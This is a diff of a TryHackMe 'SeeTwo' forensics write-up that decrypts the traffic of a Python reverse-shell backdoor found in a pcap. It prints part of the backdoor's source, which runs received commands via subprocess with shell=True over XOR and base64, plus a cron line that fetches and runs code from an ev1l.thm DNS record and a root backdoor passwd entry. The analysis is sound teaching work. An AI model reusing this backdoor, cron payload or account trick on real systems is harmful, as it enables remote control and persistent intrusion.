@@ -1,114 +1,116 @@
 ---
 author: NmToan
 date: 2025-12-29T04:59:04.866Z
-lastmod: 2025-12-29T13:39:20.763Z
-title: SeeTwo Tryhackme
-slug:  SeeTwo TryHackMe
+lastmod: 2026-04-27T00:00:00.000Z
+title: SeeTwo TryHackMe
+slug: SeeTwo-TryHackMe
 featured: false
 draft: false
 tags:
   - Forensics
   - TryHackMe
-description:  |
-  "Write-up challenge SeeTwo từ TryHackMe về phân tích lưu lượng mạng và dịch ngược mã độc Python."
+description: Write-up for the SeeTwo challenge on TryHackMe, covering traffic analysis and reversing a Python backdoor to decrypt C2 communications.
 ---
 
-> **Chủ đề:** Phân tích lưu lượng mạng và Dịch ngược Mã độc Python (C2 Traffic Decryption)
-> **Mục tiêu:** Phân tích file capture.pcap, xác định hoạt động đáng ngờ, dịch ngược mã độc và giải mã nội dung giao tiếp giữa nạn nhân (victim) và máy chủ điều khiển (C2 Server)
----
+> **Topic:** Traffic analysis and reversing a Python backdoor to decrypt the C2 channel  
+> **Goal:** Analyze `capture.pcap`, identify suspicious activity, reverse the malware, and decrypt the communication between the victim and the C2 server
 
-## Mô tả thử thách
- 
-> You are tasked with looking at some suspicious network activity by your digital forensics team.
-The server has been taken out of production while you analyze the suspicious behavior.
+## Challenge Description
 
-## Phân tích 
+The challenge provides suspicious network traffic collected by a digital forensics team. The affected server has already been removed from production, and the goal is to determine what happened.
 
-Sau khi nhận file pcap, tôi bắt đầu phân tích lưu lượng mạng. Bằng việc lọc các gói tin TCP, tôi phát hiện những đoạn dữ liệu mã hóa đáng ngờ và một tập tin đã được truyền tải thông qua giao thức HTTP.
+## Analysis Plan
 
-Stream 2:
-```
+I started by following the TCP streams in the pcap to inspect the exchanged data. Two things stood out quickly:
+
+1. a large file was downloaded over HTTP,
+2. several other streams contained long base64-looking blobs.
+
+## 1. Identify the Downloaded File
+
+One of the early streams showed:
+
+```text
 GET /base64_client HTTP/1.1
 User-Agent: Wget/1.20.3 (linux-gnu)
-Accept: */*
-Accept-Encoding: identity
 Host: 10.0.2.64
-Connection: Keep-Alive
-
-
-HTTP/1.0 200 OK
-Server: SimpleHTTP/0.6 Python/3.11.4
-Date: Fri, 27 Oct 2023 03:06:00 GMT
-Content-type: application/octet-stream
-Content-Length: 16181879
-Last-Modified: Fri, 27 Oct 2023 03:05:03 GMT
-
-f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAdSVAAAAAAABAAAAAAAAAACjBtgAAAAAAAAAAAEAAOAAL
-AEAAHAAbAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAAaA.....
-```
-Tiếp tục tăng số stream tôi phát hiện thấy một lượng lớn đoạn mã hóa có khả năng là base64
-
-Stream 3:
-```
-iVBORw0KGgoAAAANSUhEUgAAAU4AAAGFCAYAAACSfBoeAAAIUklEQVR42u3dO64qSxBE0Z45JjNEYgaYzICPh4dTyo7MWiFtP8.......
-```
-Stream 4:
-```
-iVBORw0KGgoAAAANSUhEUgAAAVwAAAFcBAMAAAB2OBsfAAAAKlBMVEXu7u7///8BAAD1Qzaenp7+TD40IyKvr6/Yz85fX1/pMiSZKSGIiIj5gnm5oY/.....
 ```
 
-Tiếp theo tôi lọc filter giao thức HTTP để phân tích các gói tin HTTP và nhận được kết quả như sau:
+The HTTP response contained a very large payload that looked like base64. Other streams also contained data beginning with:
 
-![Các gói tin HTTP](/images/seetwoTHM/http.png)
-
-Qua việc phân tích các gói tin HTTP và trước đó, tôi phát hiện có 1 file được truyền tải và tôi đã tải file này về để phân tích tiếp bằng cách sử dụng 
-``` 
-file --> export objects --> save all
+```text
+iVBORw0KGgo...
 ```
-Sau khi tải về tôi được một file có tên là `base64_client`. Tôi sử dụng lệnh `file base64_client` để kiểm tra loại file và nhận được kết quả:
 
-![Loại file](/images/seetwoTHM/file.png)
+which is a common PNG base64 prefix. That suggests the attacker was disguising data as images or generic binary content.
 
-Sau đó tiến hành tôi sử dụng lệnh cat và nhận thấy đây là một file chứa một chuỗi văn bản khổng lồ có thể là đoạn mã hóa bằng base64:
-![Nội dung file base64_client](/images/seetwoTHM/cat.png)
+I then exported the HTTP objects from Wireshark:
 
-Tôi tiến hành giải mã đoạn base64 này bằng lệnh:
+```text
+File -> Export Objects -> HTTP
 ```
+
+This produced:
+
+- `base64_client`
+
+## 2. Decode `base64_client`
+
+When viewed directly, `base64_client` was just a huge base64 text blob. I decoded it with:
+
+```bash
 base64 -d base64_client > decoded_file
 ```
-Sau khi giải mã tôi nhận được một file có tên `decoded_file`. Tôi tiếp tục sử dụng lệnh `file decoded_file` để kiểm tra loại file và nhận được kết quả:
 
-![Loại file decoded_file](/images/seetwoTHM/file_decoded.png)
+Then checked the result:
 
-Từ kết quả trên tôi nhận thấy đây là một file thực thi ELF 64-bit. Tôi sử dụng lệnh `strings decoded_file | less` để xem các chuỗi ký tự trong file và nhận được nhiều chuỗi đáng chú ý như:
-
-![Chuỗi trong decoded_file](/images/seetwoTHM/strings.png)
-Phân tích từ các chuỗi trên tôi nhận thấy đây là một mã độc được viết bằng Python và đã được đóng gói thành file thực thi ELF bằng PyInstaller. Tôi quyết định sử dụng công cụ `pyinstxtractor` để giải nén file này.
-
+```bash
+file decoded_file
 ```
+
+The output identified it as an ELF 64-bit executable.
+
+At this point it was clear that:
+
+- the victim downloaded an executable,
+- the executable had been wrapped in base64 and transferred over HTTP.
+
+## 3. Recognize It as Python Malware
+
+Running `strings decoded_file | less` revealed enough clues to suggest that it was built from Python and packaged with PyInstaller.
+
+So I extracted it using `pyinstxtractor`:
+
+```bash
 git clone https://github.com/extremecoders-re/pyinstxtractor
 cd pyinstxtractor
 python3 pyinstxtractor.py ../decoded_file
 ```
-Sau khi giải nén tôi nhận được một thư mục `decoded_file_extracted` chứa nhiều file và thư mục con. 
 
-![Toàn bộ file trong thư mục](/images/seetwoTHM/ls.png)
+This created:
 
-Tới bước này có thể chúng ta sẽ phân vân không biết nên phân tích file nào. Tuy nhiên, dựa vào kinh nghiệm của tôi khi bạn nhìn vào list các file có thể thấy một file có tên `client.pyc` rất nổi bật vì nó có tên giống với tên file trong URL ban đầu `base64_client`. Tôi quyết định phân tích file này trước.  
-Tôi sử dụng công cụ `uncompyle6` để dịch ngược file `client.pyc` về mã nguồn Python.    
-```
+- `decoded_file_extracted`
+
+Among the extracted files, the most suspicious one was:
+
+- `client.pyc`
+
+Its name closely matches the original downloaded file name, so it was the obvious next target.
+
+## 4. Decompile `client.pyc`
+
+To recover the Python source, I used `uncompyle6`:
+
+```bash
 python3 -m venv myenv
 source myenv/bin/activate
 pip install uncompyle6
 uncompyle6 -o . client.pyc
 ```
-Sau khi dịch ngược tôi nhận được file `client.py` chứa mã nguồn Python. Tôi mở file này và tiến hành phân tích mã nguồn.
+
+That gave me `client.py`, whose core logic is:
 
 ```python
-# uncompyle6 version 3.9.3
-# Python bytecode version base 3.8.0 (3413)
-# Decompiled from: Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0]
-# Embedded file name: client.py
 import socket, base64, subprocess, sys
 HOST = "10.0.2.64"
 PORT = 1337
@@ -137,57 +139,60 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         separator = "AAAAAAAAAA"
         send = encoded_image + separator + encrypted_result_base64
         s.sendall(send.encode("utf-8"))
-                                                                      
 ```
-Qua phân tích mã nguồn, có thể xác định đây là một mã độc dạng Backdoor, thiết lập kết nối Reverse Shell qua giao thức TCP để nhận lệnh từ máy chủ điều khiển (C2).
 
-1. Thông tin 
-- C2 Server: Mã độc chủ động kết nối tới địa chỉ IP 10.0.2.64.
-- Port: Cổng dịch vụ là 1337.
-- Khóa giải mã (Key): Một khóa cứng (hardcoded key) được tìm thấy trong mã nguồn là: "MySup3rXoRKeYForCommandandControl".
+## 5. Understand the Backdoor
 
-2. Cơ chế Mã hóa và Làm rối 
-- Để tránh bị phát hiện bởi các hệ thống giám sát mạng (IDS/IPS), mã độc không gửi lệnh dưới dạng văn bản rõ (plaintext) mà sử dụng thuật toán XOR kết hợp với Base64:
-- Thuật toán XOR: Sử dụng tính chất đối xứng của phép toán XOR (A ^ Key = B và B ^ Key = A) để dùng chung một hàm cho cả việc mã hóa và giải mã.
-- Cơ chế Key Cycling: Sử dụng kỹ thuật vòng lặp khóa (key[i % key_length]). Nếu dữ liệu dài hơn độ dài của khóa, khóa sẽ tự động lặp lại từ đầu để đảm bảo mọi byte dữ liệu đều được xử lý.
+The malware behavior can be summarized as follows.
 
-3. Kỹ thuật Che giấu Giao tiếp 
-Mã độc sử dụng kỹ thuật ngụy trang gói tin để đánh lừa các nhà phân tích:
+### Connection Details
 
-- Mỗi gói tin trao đổi luôn bao gồm hai phần, được ngăn cách bởi chuỗi ký tự đặc biệt: AAAAAAAAAA.
-- Phần đầu: Chứa dữ liệu rác hoặc mã Base64 của một file ảnh (nhằm giả mạo lưu lượng tải ảnh thông thường).
-- Phần sau: Chứa Payload (lệnh hoặc kết quả) đã được mã hóa.
+- C2 server: `10.0.2.64`
+- Port: `1337`
+- XOR key: `MySup3rXoRKeYForCommandandControl`
 
-4. Quy trình Xử lý Dữ liệu 
-Quá trình giao tiếp giữa máy nạn nhân và C2 diễn ra theo hai chiều như sau:
+### Traffic Obfuscation
 
-> A. Chiều Nhận lệnh (Inbound):
+Each message is split into two parts using the separator:
 
-- Phân tách: Mã độc nhận gói tin và tách lấy phần payload nằm sau chuỗi phân cách AAAAAAAAAA.
+```text
+AAAAAAAAAA
+```
 
-Giải mã:
+- The first part is fake image-like data.
+- The second part is the real encrypted payload.
 
-- Base64 Decode: Chuyển chuỗi ký tự về định dạng nhị phân (binary).
+### Encryption Scheme
 
-- XOR Decrypt: Kết hợp với khóa cứng để giải mã ra câu lệnh gốc.
+The malware uses:
 
-- Thực thi: Sử dụng hàm subprocess.check_output với tham số shell=True để chạy câu lệnh vừa giải mã trực tiếp trên hệ thống nạn nhân với quyền hạn hiện tại.
+1. `Base64` to turn binary data into text,
+2. `XOR` with a repeating key for encryption and decryption.
 
-> B. Chiều Gửi kết quả (Outbound): Ngược lại với quy trình nhận, kết quả sau khi thực thi lệnh sẽ được xử lý để gửi trả về C2:
+### Inbound Flow
 
-Mã hóa:
+1. receive data from the socket,
+2. split on `AAAAAAAAAA`,
+3. base64-decode the second part,
+4. XOR-decrypt it,
+5. execute the resulting command with `subprocess.check_output(..., shell=True)`.
 
-- XOR Encrypt: Mã hóa kết quả thực thi (dạng text) bằng thuật toán XOR.
+### Outbound Flow
 
-- Base64 Encode: Chuyển dữ liệu đã mã hóa sang dạng chuỗi Base64 để thuận tiện truyền tải.
+1. take the command output,
+2. XOR-encrypt it,
+3. base64-encode it,
+4. append it after the fake image data,
+5. send it back to the C2 server.
 
-- Đóng gói (Re-packaging): Ghép chuỗi kết quả này vào sau dữ liệu ảnh giả mạo và chuỗi phân cách AAAAAAAAAA. Điều này giúp duy trì vỏ bọc ngụy trang nhất quán trong cả hai chiều giao tiếp.
+So this is a simple but functional Python backdoor.
 
-Sau khi phân tích kỹ mã nguồn, tôi đã nhờ AI tạo một script để giải mã chuỗi văn bản khổng lồ đã tìm thấy trong file pcap ban đầu. Dưới đây là script Python mà tôi đã sử dụng:
+## 6. Decrypt the Full C2 Traffic
+
+Once the format was understood, I wrote a script to decode the command and result payloads from the traffic dump:
 
 ```python
 import base64
-import os
 
 INPUT_PATH = r"D:\CTF\THM\evidence-1698376680956\dump.txt"
 OUTPUT_PATH = INPUT_PATH.replace("dump.txt", "communicate.txt")
@@ -202,45 +207,53 @@ def main():
              open(OUTPUT_PATH, "w", encoding="utf-8") as outfile:
             for line in infile:
                 line = line.strip()
-                if not line: continue
-                try:  
+                if not line:
+                    continue
+                try:
                     if SEPARATOR in line:
                         encoded_data = line.split(SEPARATOR)[1]
                     else:
-                        continue 
-                    # 2. Base64 Decode
+                        continue
+
                     decoded_data = base64.b64decode(encoded_data)
-                   
-                    # 3. XOR Decrypt
-                    decrypted = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(decoded_data))                   
+                    decrypted = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(decoded_data))
                     decrypted_text = decrypted.decode("utf-8", errors="ignore")
                     outfile.write(decrypted_text + "\n")
                     success_count += 1
                 except (IndexError, base64.binascii.Error, ValueError):
                     continue
- 
     except Exception as e:
-        print(f"[-] Lỗi: {e}")
+        print(f"[-] Error: {e}")
 
 if __name__ == "__main__":
     main()
 ```
-Sau khi chạy script trên, tôi nhận được một file `communicate.txt` chứa các lệnh đã được giải mã. Tôi mở file này và tìm thấy nhiều lệnh hệ thống đã được thực thi trên máy nạn nhân, tới đây chúng ta đã có đủ dữ liệu để có thể trả lời các câu hỏi của challenge.
 
-![Nội dung file](/images/seetwoTHM/communicate.png)
+This generated:
 
-## Kết luận và Trả lời câu hỏi
+- `communicate.txt`
+
+The file contained the decrypted commands and outputs, which provided enough evidence to answer the challenge questions.
+
+## Answers
+
 1. **What is the first file that is read? Enter the full path of the file.**
-    - Đáp án: ```/home/bella/.bash_history```
+   - `/home/bella/.bash_history`
+
 2. **What is the output of the file from question 1?**
-    - Đáp án: ```mysql -u root -p'vb0xIkSGbcEKBEi'```
+   - `mysql -u root -p'vb0xIkSGbcEKBEi'`
+
 3. **What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user.**
-    - Đáp án: ```toor::0:0:root:/root:/bin/bash```
+   - `toor::0:0:root:/root:/bin/bash`
+
 4. **What is the name of the backdoor executable?**
-    - Đáp án: ```/usr/bin/passswd```
+   - `/usr/bin/passswd`
+
 5. **What is the md5 hash value of the executable from question 4?**
-    - Đáp án: ```23c415748ff840b296d0b93f98649dec```
+   - `23c415748ff840b296d0b93f98649dec`
+
 6. **What was the first cronjob that was placed by the attacker?**
-    - Đáp án: ```* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"```
+   - `* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"`
+
 7. **What is the flag?**
-    - Đáp án: ```THM{See2sNev3rGetOld}```
+   - `THM{See2sNev3rGetOld}`
